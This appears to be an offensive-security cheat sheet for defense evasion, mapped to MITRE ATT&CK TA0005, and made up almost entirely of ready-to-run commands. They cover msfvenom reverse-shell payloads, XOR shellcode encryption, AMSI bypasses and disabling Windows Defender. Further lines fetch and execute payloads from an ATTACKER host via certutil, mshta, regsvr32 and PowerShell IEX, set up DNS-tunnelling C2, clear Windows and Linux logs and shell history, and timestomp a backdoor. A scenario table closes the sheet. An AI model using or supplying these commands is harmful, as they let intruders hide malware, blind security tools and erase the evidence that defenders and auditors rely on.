# Defense Evasion — Deep Dive (TA0005)

> Techniques for avoiding detection by security tools, logging, and defenders.
> Maps to MITRE ATT&CK TA0005 — Defense Evasion.

---

## AV/EDR Evasion

### Payload Obfuscation
```bash
# Basic msfvenom encoding (easily detected, but good baseline)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -e x64/xor_dynamic -i 5 -f exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -e x64/zutto_dekiru -i 3 -f exe

# Shellcode generation (for custom loaders)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f raw -o payload.bin
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f csharp  # C# byte array
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f python  # Python byte string

# XOR encrypt shellcode manually
python3 -c "
import sys
key = 0x41
with open('payload.bin','rb') as f: sc = f.read()
enc = bytes([b ^ key for b in sc])
with open('encrypted.bin','wb') as f: f.write(enc)
print(f'Encrypted {len(sc)} bytes with key 0x{key:02x}')
"
```

### AMSI Bypass (PowerShell)
```powershell
# Classic AMSI bypass (patch amsi.dll in memory)
# NOTE: These get signatured quickly, always test first

# Reflection method
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Memory patching (more reliable)
$a=[Ref].Assembly.GetTypes()|?{$_.Name -like "*siU*"};$b=$a.GetFields('NonPublic,Static')|?{$_.Name -like "*Failed"};$b.SetValue($null,$true)

# Always obfuscate the bypass itself — AV signatures the bypass code too
```

### Windows Defender Evasion
```bash
# Check Defender status
Get-MpComputerStatus
Get-MpPreference

# Exclusion abuse (if you have admin)
Add-MpPreference -ExclusionPath "C:\temp"
Add-MpPreference -ExclusionProcess "payload.exe"
Add-MpPreference -ExclusionExtension ".exe"

# Disable real-time protection (admin required, logged)
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableScriptScanning $true
```

### Living off the Land (LOLBins)
```bash
# Use legitimate Windows binaries to execute payloads
# Full reference: https://lolbas-project.github.io/

# Download & execute
certutil -urlcache -f http://ATTACKER/payload.exe C:\temp\payload.exe
bitsadmin /transfer job http://ATTACKER/payload.exe C:\temp\payload.exe
mshta http://ATTACKER/payload.hta
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";document.write();h=new%20ActiveXObject("WScript.Shell").Run("payload")

# Execute without writing to disk
mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/script.ps1')"", 0:close")

# Proxy execution
rundll32.exe shell32.dll,Control_RunDLL payload.dll
regsvr32 /s /n /u /i:http://ATTACKER/payload.sct scrobj.dll

# Compile and execute C# inline
# C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:C:\temp\payload.exe payload.cs
# C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false C:\temp\payload.exe
```

### Linux LOLBins
```bash
# GTFOBins equivalents — https://gtfobins.github.io/

# File download without wget/curl
python3 -c "import urllib.request; urllib.request.urlretrieve('http://ATTACKER/file', '/tmp/file')"
perl -e 'use LWP::Simple; getstore("http://ATTACKER/file", "/tmp/file");'
php -r "file_put_contents('/tmp/file', file_get_contents('http://ATTACKER/file'));"
ruby -e "require 'open-uri'; File.write('/tmp/file', URI.open('http://ATTACKER/file').read)"

# Execute via interpreters
python3 -c 'import os; os.system("/tmp/payload")'
perl -e 'system("/tmp/payload")'
```

---

## Network Evasion

### Encrypted C2 Channels
```bash
# HTTPS reverse shell (encrypted traffic)
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=443 -f exe

# DNS tunneling (bypass firewall)
dnscat2-server DOMAIN.COM
# On target: dnscat2 DOMAIN.COM

# ICMP tunneling
# icmpsh / ptunnel
```

### Traffic Blending
```bash
# Use common ports: 80, 443, 53, 8080
# Use domain fronting if available
# Make C2 traffic look like normal HTTPS/HTTP traffic

# Metasploit HTTP profiles
set HttpUserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
set HttpServerName "Microsoft-IIS/10.0"
```

### Proxy Chains
```bash
# Route traffic through SOCKS proxy
proxychains4 nmap -sT -Pn TARGET
proxychains4 curl http://TARGET

# Chain multiple proxies in /etc/proxychains4.conf
# [ProxyList]
# socks5 PROXY1_IP 1080
# socks5 PROXY2_IP 1080
```

---

## Log Evasion

### Windows Log Clearing
```bash
# Clear all event logs
wevtutil cl Security
wevtutil cl System
wevtutil cl Application
wevtutil cl "Windows PowerShell"
wevtutil cl "Microsoft-Windows-PowerShell/Operational"

# Selective clearing (stealthier)
# Delete specific event IDs rather than clearing entire logs

# Disable logging
auditpol /set /category:* /success:disable /failure:disable
```

### Linux Log Clearing
```bash
# Clear auth logs
> /var/log/auth.log
> /var/log/secure
> /var/log/syslog
> /var/log/messages

# Clear bash history
history -c
> ~/.bash_history
unset HISTFILE
export HISTSIZE=0

# Remove specific log entries
sed -i '/ATTACKER_IP/d' /var/log/auth.log

# Timestomp files
touch -r /bin/ls /tmp/backdoor    # Copy timestamp from legitimate file
```

### Disable Logging
```bash
# Linux — disable logging temporarily
systemctl stop rsyslog
systemctl stop auditd

# Prevent history recording for current session
unset HISTFILE
set +o history
```

---

## Process & Memory Evasion

### Process Injection (Windows)
```bash
# Via Meterpreter
meterpreter> ps                    # List processes
meterpreter> migrate PID           # Migrate to another process (e.g., explorer.exe)
meterpreter> getpid                # Verify

# Good targets for migration:
# explorer.exe — always running, user context
# svchost.exe — many instances, blends in
# RuntimeBroker.exe — common, less monitored
```

### In-Memory Execution
```bash
# PowerShell — download and execute in memory
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/script.ps1')"

# .NET Assembly loading (Meterpreter)
meterpreter> execute -H -m -d calc.exe -f payload.exe -a "-args"

# Reflective DLL injection
# Load DLL directly into memory without touching disk
```

### Fileless Techniques
```bash
# Registry-based payload storage
reg add "HKCU\Software\Classes\payload" /v data /t REG_SZ /d "BASE64_ENCODED_PAYLOAD"
# Retrieve and execute via PowerShell

# WMI-based execution (no file on disk)
# Store payload in WMI class properties
# Execute via WMI event subscription
```

---

## Quick Reference: Evasion by Scenario

```
AV blocking your payload    → Custom loader with XOR'd shellcode → LOLBins → AMSI bypass
EDR catching your tools     → Live off the land → Memory-only execution → Process injection
Firewall blocking outbound  → DNS tunnel → ICMP tunnel → Use allowed ports (80/443)
Logs catching your activity → Disable/clear logs → Timestomp → Use encrypted channels
IDS flagging network traffic → Encrypted C2 → Domain fronting → Traffic blending
PowerShell constrained      → AMSI bypass → Use .NET directly → Compile C# on target
AppLocker blocking .exe     → DLL side-loading → MSBuild → InstallUtil → Regsvr32
```
